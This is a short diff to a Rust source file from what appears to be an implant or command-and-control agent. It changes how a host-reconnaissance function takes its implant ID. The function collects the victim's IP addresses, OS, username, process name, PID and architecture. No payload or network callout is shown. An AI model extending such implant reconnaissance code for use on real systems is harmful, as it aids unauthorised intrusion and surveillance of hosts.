@@ -1,4 +1,3 @@
-use arrayvec::ArrayVec;
 use gethostname::gethostname;
 use local_ip_address::list_afinet_netifas;
 use reqwest;
@@ -9,7 +8,7 @@ use users::get_current_username;
 use crate::errors::ImplantError;
 use crate::models::system_info::SystemInfo;
 
-pub fn gather_system_info(base64_implant_id: &str) -> Result<SystemInfo, ImplantError> {
+pub fn gather_system_info(implant_id: &str) -> Result<SystemInfo, ImplantError> {
     let external_ip_address = get_external_ip_address()?;
     let internal_ip_address = get_internal_ip_address()?;
     let os_type = (env::consts::OS).to_owned();
@@ -18,11 +17,6 @@ pub fn gather_system_info(base64_implant_id: &str) -> Result<SystemInfo, Implant
     let process_name = get_current_executable_name();
     let pid = process::id().try_into().unwrap();
     let architecture = (env::consts::ARCH).to_owned();
-
-    let implant_id_vec = base64::decode(base64_implant_id)?;
-    let implant_id_bytes: ArrayVec<u8, 16> = implant_id_vec.into_iter().collect();
-    let implant_id_bytes = implant_id_bytes.into_inner()?;
-    let implant_id = uuid::Uuid::from_bytes(implant_id_bytes);
 
     let system_info = SystemInfo::new(
         external_ip_address,
@@ -33,7 +27,7 @@ pub fn gather_system_info(base64_implant_id: &str) -> Result<SystemInfo, Implant
         process_name,
         pid,
         architecture,
-        implant_id,
+        implant_id.to_owned(),
     );
 
     Ok(system_info)
